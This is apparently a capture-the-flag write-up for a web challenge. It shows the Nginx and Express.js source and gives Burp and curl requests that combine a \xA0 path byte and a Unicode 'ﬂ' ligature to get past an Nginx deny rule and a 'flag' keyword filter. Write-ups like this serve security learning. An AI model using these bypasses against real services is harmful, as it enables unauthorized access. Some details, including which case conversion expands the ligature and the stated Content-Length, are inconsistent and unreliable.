# ䷃ youth_case

## Description

Bypass 👨‍💻filter

## Initial Analysis

### Application Overview
The challenge presents a web application built with Express.js (Node.js) behind an Nginx reverse proxy. The application has a simple interface with a search functionality.

### Key Files Analysis

#### 1. `ag.js` - Data Source
```javascript
module.exports = [
    {
        "id": 1,
        "name": "FLAG",
        "description": "DH{fake_flag}"
    },
    {
        "id": 2,
        "name": "DRAG",
        "description": "To pull something along forcefully..."
    },
    {
        "id": 3,
        "name": "SLAG", 
        "description": "The waste material produced by the smelting process..."
    },
    {
        "id": 4,
        "name": "SWAG",
        "description": "Refers to stylish confidence..."
    }
]
```

#### 2. `nginx.conf` - Reverse Proxy Configuration
```nginx
events {
    worker_connections  1024;
}

http {
    server {
        listen 80;
        server_name  _;
        
        location = /shop {
            deny all;
        }

        location = /shop/ {
            deny all;
        }

        location / {
            proxy_pass http://app:3000/;
        }
    }
}
```

**Key Security Measure**: Direct access to `/shop` and `/shop/` endpoints is blocked by Nginx.

#### 3. `app.js` - Express Application
```javascript
const words = require("./ag")
const express = require("express")

const PORT = 3000
const app = express()
app.set('case sensitive routing', true)
app.use(express.urlencoded({ extended: true }))

function search(words, leg) {
    return words.find(word => word.name === leg.toUpperCase())
}

app.post("/shop", (req, res) => {
    const leg = req.body.leg.toLowerCase()

    if (leg == 'flag'){
        return res.status(403).send("Access Denied")
    }

    const obj = search(words, leg)

    if (obj){
        return res.send(JSON.stringify(obj))
    }

    return res.status(404).send("Nothing")
})
```

**Key Security Features**:
- Case-sensitive routing enabled: `app.set('case sensitive routing', true)`
- Input validation: blocks requests where `leg === 'flag'`
- Search function converts input to uppercase for matching

## Vulnerability Analysis

### 1. Nginx Path Normalization Bypass

**The Problem**: Nginx performs path normalization before checking access rules, but if the backend server (Node.js) performs different normalization, we can bypass the restrictions.

**The Solution**: Certain characters are not normalized by Nginx but are normalized by Node.js Express, allowing us to bypass the `/shop` restriction.

### 2. Unicode Case Conversion Bypass

**The Problem**: The application uses `toLowerCase()` to filter the input and `toUpperCase()` in the search function.

**The Solution**: Some Unicode characters change to ASCII characters when converted to lowercase/uppercase.

## Exploitation

### Step 1: Bypass Nginx Restrictions

Based on the Nginx version (1.22.0 from Dockerfile), we can use the `\xA0` (non-breaking space) character to bypass the path restriction.

- Nginx sees: `/shop\xA0` (not matching `/shop` exactly)
- Express normalizes it to: `/shop`

### Step 2: Bypass Flag Filter

The application filters `'flag'` in lowercase, but we can use Unicode ligature:
- Use `ﬂag` instead of `flag`
- The `ﬂ` character (U+FB02) converts to `fl` when processed by `toLowerCase()`

### Step 3: Exploitation Process

#### Using Burp Suite:

1. **Intercept a request** to the application
2. **Send to Repeater** for modification
3. **Modify the request**:
   ```http
   POST /shopa HTTP/1.1
   Host: target
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 8
   
   leg=ﬂag
   ```
4. **Switch to Hex tab** and change the `a` (ASCII 61) to `a0` (hex for \xA0)
5. **Send the request**

#### Manual curl approach:
```bash
# Create the request with the special Unicode characters
curl -X POST "http://target/shop%A0" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "leg=ﬂag"
```

## Flag Retrieval

After successfully bypassing both filters:

1. **Nginx bypass**: `/shop\xA0` → normalized to `/shop` by Express
2. **Flag filter bypass**: `ﬂag` → normalized to `FLAG` by `toUpperCase()`
3. **Response**: The application returns the FLAG object with the actual flag

## Key Learning Points

### 1. Nginx-Backend Normalization Differences
- Different web servers handle path normalization differently
- Characters that bypass one layer might be normalized by another
- Important to understand the specific version behaviors

### 2. Unicode Case Conversion Quirks
- `toLowerCase()` and `toUpperCase()` methods can convert Unicode to ASCII
- Ligatures like `ﬂ` (U+FB02) convert to `fl` during case conversion
- Other examples: `ſ` → `s`, `K` → `k`

### 3. Defense Implications
- Input validation should happen after all normalization
- Consider Unicode normalization in security controls
- Defense in depth: don't rely solely on proxy-level restrictions


## Conclusion

This challenge demonstrates the importance of understanding how different components in a web application stack handle input normalization. The combination of Nginx path normalization bypass and Unicode case conversion bypass created a pathway to retrieve the flag despite multiple security controls.
